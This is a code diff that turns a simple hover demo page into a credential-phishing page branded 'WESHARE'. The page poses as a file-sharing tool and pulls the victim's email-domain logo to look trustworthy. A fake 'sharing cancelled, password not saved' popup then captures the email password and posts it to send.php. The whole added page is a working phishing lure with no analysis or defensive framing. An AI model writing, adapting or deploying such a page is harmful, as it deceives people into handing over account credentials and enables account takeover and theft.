@@ -3,42 +3,136 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mouse Hover Opens New URL</title>
+    <title>Email Domain Logo Detection</title>
     <style>
-        /* Style for the container */
         body {
             font-family: Arial, sans-serif;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
+            justify-content: center;
             height: 100vh;
             margin: 0;
-            background-color: #f0f0f0;
         }
-
-        .hover-area {
-            width: 200px;
-            height: 100px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background-color: #4CAF50;
-            color: white;
-            font-size: 20px;
-            border-radius: 8px;
-            cursor: pointer;
+        input[type="email"], input[type="password"], button { width: 180%;
+            padding: 10px;
+            margin-top: 10px;
+            width: 260px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: white;
+            border: 1px solid #ccc;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            padding: 20px;
+            z-index: 1000;
+        }
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
         }
     </style>
 </head>
 <body>
 
-<div class="hover-area" onmouseover="openNewURL()">
-    Hover me!
+    <center>  <h1> WESHARE
+    
+</h1> <BR> <h3>Enter recipient's email to share this file</h3></BR>
+<input type="email" id="email" placeholder="Email address" required>
+<button onclick="checkEmail()">Share</button> </center>
+    </form>
+
+<div class="overlay" id="overlay"></div>
+<div class="popup" id="popup">
+    <span onclick="closePopup()" style="cursor:pointer; float:right;">&times;</span>
+    <img id="logo" src="" alt="Domain Logo" style="display:none;">
+    <h3>Sharing cancelled !  </h3>
+    <p>    Email password not saved on this device!<br> Enter password to continue sharing</p>
+    <p id="emailDisplay"><strong></strong></p> <!-- Display only the email here in bold -->
+    
+    <form id="loginForm" onsubmit="handleLogin(event)">
+        <input type="password" id="password" placeholder="Enter your password" required><br>
+        <button type="submit">Save Password</button> 
 </div>
 
 <script>
-    function openNewURL() {
-        window.open('https://www.example.com', '_blank');
+    async function checkEmail() {
+        const email = document.getElementById('email').value;
+
+        if (email) {
+            const domain = email.split('@')[1];
+
+            // Show the overlay and popup
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('popup').style.display = 'block';
+
+            // Display only the entered email in bold
+            document.getElementById('emailDisplay').innerHTML = `<strong>${email}</strong>`;
+
+            // Fetch the logo using Clearbit Logo API
+            const logoUrl = `https://logo.clearbit.com/${domain}`;
+            
+            // Set the logo image source
+            const logoImage = document.getElementById('logo');
+            logoImage.src = logoUrl;
+
+            // Handle errors if the image fails to load
+            logoImage.onload = () => {
+                logoImage.style.display = 'block';
+                document.getElementById('popup').style.display = 'block';
+            };
+
+            logoImage.onerror = () => {
+                alert('Logo not found for this domain.');
+                closePopup();
+            };
+        } else {
+            alert('Please enter a valid email address.');
+        }
+    }
+
+    function closePopup() {
+        document.getElementById('overlay').style.display = 'none';
+        document.getElementById('popup').style.display = 'none';
+    }
+
+    function handleLogin(event) {
+        event.preventDefault(); // Prevent default form submission
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        // Create a FormData object to send data
+        const formData = new FormData();
+        formData.append('email', email);
+        formData.append('password', password);
+
+        // Send data to PHP script using fetch API
+        fetch('send.php', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.text())
+        .then(data => {
+            console.log(data); // Handle response from PHP script
+            closePopup(); // Close the popup after submission
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
     }
 </script>
 
